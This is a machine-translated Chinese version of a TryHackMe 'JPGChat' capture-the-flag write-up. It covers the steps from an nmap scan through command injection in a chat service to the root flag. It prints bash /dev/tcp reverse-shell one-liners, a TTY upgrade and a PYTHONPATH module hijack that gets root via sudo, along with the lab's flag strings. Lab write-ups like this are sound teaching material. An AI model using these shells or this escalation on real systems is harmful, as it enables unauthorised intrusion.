<html>
<head>
<title>TryHackMe | JPGChat Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe | JPGChat报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-jpgchat-writeup-5a6ec94c2c8d?source=collection_archive---------1-----------------------#2021-03-01">https://infosecwriteups.com/tryhackme-jpgchat-writeup-5a6ec94c2c8d?source=collection_archive---------1-----------------------#2021-03-01</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="8e3c" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">概观</h1><p id="9636" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">嘿，大家好。我带着另一篇文章回来了，这一次尝试了<a class="ae lj" href="https://tryhackme.com/room/jpgchat" rel="noopener ugc nofollow" target="_blank"><em class="lk">jpg chat</em></a>by<em class="lk"/><a class="ae lj" href="https://tryhackme.com/p/R4v3n" rel="noopener ugc nofollow" target="_blank"><em class="lk">R4v3n</em></a><em class="lk">。</em>这是一个相当简单的盒子，有一个有趣的变化，你必须做一些GitHub搜索来找到聊天服务的源代码。从那里，你得到一个反向壳回来，并获得最初的立足点。之后，有一个python可执行文件，用户可以使用root权限运行，无需密码。为了利用它，您必须欺骗PYTHONPATH变量。所以，没别的说了，就从盒子开始吧。</p><h1 id="4ae4" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">我们闯进去吧！</h1><p id="ebab" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">像往常一样，从NMap扫描开始。</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="35e2" class="lu jo iq lq b gy lv lw l lx ly">sudo nmap -sS -sV -sC -oA nmap/chat *THM Box IP* -vv</span></pre><blockquote class="lz ma mb"><p id="8aa0" class="kl km lk kn b ko mc kq kr ks md ku kv me mf ky kz mg mh lc ld mi mj lg lh li ij bi translated">这里-sS: SYN Scan，-sC:用于“安全”脚本或默认脚本，-sV:用于版本枚举，-oA:所有格式的输出(Greppable、XML和默认NMap输出)，-vv:用于详细。</p></blockquote><figure class="ll lm ln lo gt ml gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mk"><img src="../Images/e2658496cf632f1a02b92a378a59028a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8pABKVs8A_hVsWdeDZ4Cpw.png"/></div></div></figure><p id="3f65" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">NMap完成扫描后，我们看到只有两个端口22(ssh)和3000(ppp)处于打开状态。在通过我们的浏览器访问端口3000上的服务时，我们看到我们有一些关于如何使用该服务的说明。但是，当通过网络浏览器访问时，该服务并没有完全发挥作用。</p><figure class="ll lm ln lo gt ml gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mk"><img src="../Images/a04826c3c2a21fd8d59ad3ff0cf830a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V7iuwx6buHuUur5YspIFIw.png"/></div></div></figure><p id="bd9f" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">所以让我们使用NetCat来连接服务。</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="4171" class="lu jo iq lq b gy lv lw l lx ly">nc *THM Box IP* 3000 </span></pre><figure class="ll lm ln lo gt ml gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mk"><img src="../Images/6f89f610a442a31f65551b9498b6bcbb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gZ8_KvtVVTKjsLB1JEWsNA.png"/></div></div></figure><p id="5b9d" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">通过NetCat连接后，我们看到消息传递和报告功能对我们都可用。该服务还告诉我们，源代码可以在admins GitHub上找到。为了找到管理员的名字，我们连接到服务的[报告]功能，服务泄漏了管理员的名字。现在，要找到源代码，只需在GitHub中稍微浏览一下，我们就能找到服务的源代码。</p><figure class="ll lm ln lo gt ml gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mk"><img src="../Images/32a4f1adf3eba4ef8b603e706d48fab3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kqle3DkZCJ1j3GHgk_-A8Q.png"/></div></div></figure><p id="5c7f" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">该服务利用python的操作系统模块，并使用bash shell运行命令。通过使用通用的bash反向shell一行程序，我们可以很容易地获得反向shell。</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="1b61" class="lu jo iq lq b gy lv lw l lx ly">bash -i &gt;&amp; /dev/tcp/*Your OpenVPN IP*/*port you’re listening on*</span></pre><p id="3d45" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">这台机器确实接通了，但由于某种原因总是中断。因此，让我们使用另一个带有编码字符的liner。</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="ed2f" class="lu jo iq lq b gy lv lw l lx ly">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span></pre><blockquote class="lz ma mb"><p id="0573" class="kl km lk kn b ko mc kq kr ks md ku kv me mf ky kz mg mh lc ld mi mj lg lh li ij bi translated">想了解更多类似的精彩的一句话，请访问swisskys的GitHub知识库。</p></blockquote><figure class="ll lm ln lo gt ml gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mk"><img src="../Images/9c803107e0f942622d9f365e49fb0aca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EmqjSQhb9l7b3ix9sw7cNA.png"/></div></div></figure><p id="e768" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">这次我们得到了没有任何问题的反向外壳。但是，这个shell不可用，因为命令输出在屏幕上不可见。但是，我们确实执行了命令。所以，我们可以再次让机器连接到我们，以获得反向外壳。</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="c337" class="lu jo iq lq b gy lv lw l lx ly">bash -c 'bash -i &gt;&amp; /dev/tcp/*Your OpenVPN IP*/*port you’re listening on*'</span></pre><figure class="ll lm ln lo gt ml gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mk"><img src="../Images/bac874cb9ff58f9a96c3fdd934afc274.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XvfWMNs0Twt0z67V1qaZoA.png"/></div></div></figure><p id="7e1e" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">现在我们有了一个可用的外壳。让我们升级到一个完整的TTY外壳。</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="d8b8" class="lu jo iq lq b gy lv lw l lx ly">python3 -c ‘import pty; pty.spawn(“/bin/bash”)’</span></pre><p id="71a9" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">这会给你一个稍微好一点的外壳，但是没有那些神奇的特性。要获得功能完整的TTY shell:</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="713e" class="lu jo iq lq b gy lv lw l lx ly">Press Ctrl-z to background the current shell, then on your terminal type:<br/>stty raw -echo; fg &lt;enter&gt;&lt;enter&gt;</span></pre><p id="04ed" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">然后在你的外壳上:</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="e958" class="lu jo iq lq b gy lv lw l lx ly">stty rows 36 cols 136<br/>export TERM=xterm-256color</span></pre><p id="c560" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated"><strong class="kn ir">用户标志:</strong> THM{w4it_h0w_c4n_th3s_b3}</p><p id="556d" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">现在，将我们的权限提升到root。运行<code class="fe ms mt mu lq b">sudo -l</code>我们得到一个提示，我们的用户可以以root NOPASSWD身份运行test-module.py。我们不能修改脚本，但我们可以阅读它。</p><p id="bda7" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">该脚本正在导入一个比较模块，这意味着我们可以欺骗PYTHONPATH变量，并创建我们自己的伪compare.py模块，并使用它来获取root。</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="7ac4" class="lu jo iq lq b gy lv lw l lx ly">cd /tmp</span><span id="3384" class="lu jo iq lq b gy mv lw l lx ly">export PYTHONPATH=$PWD<br/>touch compare.py<br/>chmod +x compare.py</span></pre><p id="2858" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated"><strong class="kn ir">等等</strong>！，但是PYTHONPATH是什么，你怎么知道这个脚本在用它。别担心，因为我正要告诉你。</p><p id="2422" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">因此，PYTHONPATH是一个环境变量，顾名思义，如果模块不在默认的全局目录中，python脚本就在这个路径中查找被调用的模块<strong class="kn ir">。因此，这意味着如果一个python脚本试图调用一个预定义的模块(例如os)，欺骗PYTHONPATH对脚本没有影响，因为它不会访问PATH变量。</strong></p><figure class="ll lm ln lo gt ml gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mk"><img src="../Images/f164a5ae46d07b2a4881c32a7eab05f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*urgBYXSzeV6yL7I7tLDnmw.png"/></div></div></figure><p id="1f9f" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">脚本是如何使用它的，首先当你<code class="fe ms mt mu lq b">sudo -l</code>注意到右上角写着env_keep+=PYTHONPATH，这意味着当调用任何东西作为sudo时，它将保持PYTHONPATH环境变量。其次，如果您阅读了该脚本，并且具有一点python编程知识，您会注意到正在导入的模块“compare”不是python编程语言的标准模块，这可能意味着用户可能没有将它安装在全局目录中，这又会导致相同的结论。</p><p id="c351" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">现在在compare.py中，进行一个系统调用，以sudo的身份调用bash。</p><pre class="ll lm ln lo gt lp lq lr ls aw lt bi"><span id="cd8e" class="lu jo iq lq b gy lv lw l lx ly">#!/usr/bin/env python3<br/>import os</span><span id="64ec" class="lu jo iq lq b gy mv lw l lx ly">os.system("/bin/bash")</span></pre><p id="4d93" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">这里刚刚发生了什么？</p><p id="2830" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">这个脚本非常简单，但不是所有人都能理解这里发生了什么。因此，我们导入了一个名为os的模块，它使我们能够从脚本中调用和执行系统命令，然后我们使用系统函数来调用bash shell。如果您以普通用户的身份运行这个脚本，什么都不会改变。但是，如果您以root权限运行，您将拥有一个root shell。</p><p id="8967" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated"><em class="lk">这很好，但是为什么导入一个模块会给我们一个根shell呢？</em></p><p id="ea4b" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">当你用python或者其他语言导入一个模块时，它可以导入这个模块中指定的函数或类，也可以导入整个包。在这个场景中，它正在导入整个包<em class="lk"/>(由通配符“*”指定)。然后，它调用比较模块中的一个函数，只要那一行被执行，我们的伪模块就开始做它的事情。它调用具有root权限的bash shell，脚本停留在后台。当您退出根shell，回到普通用户时，您可能已经注意到它给出了一个错误，没有找到指定的函数。这意味着，这段时间以来，脚本一直在调用函数，这给了我们的shell持久性。</p><p id="c771" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">这只是一个非常外行的解释而已，如果你想进入真正的技术细节，请阅读<a class="ae lj" href="https://medium.com/python-features/what-happens-behind-the-scenes-when-we-import-a-module-in-python-2775da153790" rel="noopener"><strong class="kn ir"><em class="lk"/></strong></a>这篇非常透彻的文章。</p><p id="7188" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">现在，以sudo的身份运行test-module.py。我们得到了根。</p><figure class="ll lm ln lo gt ml gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mk"><img src="../Images/efb905c8691f299a8ad533ac4d2a687e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P5mMUBWIqh8IcoPa7aW3Ag.png"/></div></div></figure><p id="e760" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated"><strong class="kn ir">Root-Flag:</strong>THM { h4h4h 4 _ g0t _ y4 _ suck 3rs }</p><p id="b4ff" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">这就是那个盒子，希望你们喜欢。</p><p id="c7ae" class="pw-post-body-paragraph kl km iq kn b ko mc kq kr ks md ku kv kw mf ky kz la mh lc ld le mj lg lh li ij bi translated">祝你有美好的一天！</p></div></div>    
</body>
</html>